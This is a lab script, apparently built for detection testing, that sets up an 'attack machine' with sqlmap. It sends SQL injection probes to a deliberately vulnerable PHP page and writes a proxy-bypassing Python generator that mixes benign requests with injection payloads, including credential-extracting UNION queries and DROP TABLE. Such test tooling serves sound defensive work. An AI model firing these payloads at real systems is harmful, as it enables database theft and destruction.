
###########################################
### Remote attack machine  ################
###########################################

# For Debian/Ubuntu
apt-get update
apt-get install -y sqlmap curl wget python3 python3-pip

# For RHEL/Centos/Rocky
dnf install -y epel-release
dnf install -y sqlmap curl wget python3 python3-pip

# Test no attack (benign) requests
curl --noproxy "*" http://192.168.1.101/vulnerable.php

# Test with a single quote (basic SQL injection attempt)
curl --noproxy "*" http://192.168.1.101/vulnerable.php?id=1%27

# Test with a UNION statement
curl --noproxy "*" http://192.168.1.101/vulnerable.php?id=1%20UNION%20SELECT%201,2,3

# Test with an OR statement
curl --noproxy "*" http://192.168.1.101/vulnerable.php?id=1%20OR%201=1


##### Test with script for automated SQL injection attempts #####
## This script generates a series of requests to the target URL
## with both normal and attack payloads (5% are attacks)

cat > test_sql_injection.py << 'EOF'
import requests
import random
import time
import argparse
import os
from datetime import datetime

def log_request(request_num, is_attack, payload, response_code):
    """Log details of each request for later analysis"""
    attack_status = "ATTACK" if is_attack else "normal"
    print(f"[{datetime.now().strftime('%H:%M:%S')}] Request {request_num:03d}: {attack_status} | Payload: {payload} | Response: {response_code}")

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Test Generator')
    parser.add_argument('--target', required=True, help='Target URL (e.g., http://192.168.1.101/vulnerable.php)')
    parser.add_argument('--param', default='id', help='Parameter name to inject (default: id)')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests in seconds (default: 0.5)')
    args = parser.parse_args()

    # Set no_proxy environment variable to bypass all proxies
    os.environ['no_proxy'] = '*'

    # Alternatively, create a session with trust_env=False
    session = requests.Session()
    session.trust_env = False

    # Normal, benign queries
    normal_queries = [
        "1", "42", "100", "999",
        "select", "from", "where", "table",
        "product", "user", "admin", "guest",
        "test", "demo", "example", "sample"
    ]

    # Extend normal queries to have enough variety
    extended_normal = []
    for i in range(1, 500):
        extended_normal.append(str(i))
    for word in ["item", "product", "user", "customer", "order", "category"]:
        for i in range(1, 10):
            extended_normal.append(f"{word}{i}")

    normal_queries.extend(extended_normal)
    normal_queries = list(set(normal_queries))  # Remove duplicates

    # SQL injection attack patterns
    attack_queries = [
        "1' OR '1'='1",
        "1 UNION SELECT username,password,3 FROM users--",
        "1; DROP TABLE users--",
        "1' OR 1=1 --",
        "admin' --"
    ]

    # Randomly select positions for attack queries
    total_requests = 100
    attack_positions = random.sample(range(total_requests), len(attack_queries))

    print(f"Starting test with {total_requests} requests ({len(attack_queries)} attacks)")
    print(f"Attack positions: {sorted(attack_positions)}")
    print("-" * 80)

    for i in range(total_requests):
        is_attack = i in attack_positions

        if is_attack:
            attack_index = attack_positions.index(i)
            payload = attack_queries[attack_index]
        else:
            payload = random.choice(normal_queries)

        # Construct and send the request using the session (proxy-bypassing)
        params = {args.param: payload}
        try:
            # Use the session to bypass proxy
            response = session.get(args.target, params=params, timeout=5)
            log_request(i+1, is_attack, payload, response.status_code)
        except Exception as e:
            print(f"Error on request {i+1}: {str(e)}")

        # Add delay between requests
        time.sleep(args.delay)

    print("-" * 80)
    print(f"Test completed. Sent {total_requests} requests with {len(attack_queries)} attack payloads.")
    print(f"Attack positions were: {sorted(attack_positions)}")

if __name__ == "__main__":
    main()
EOF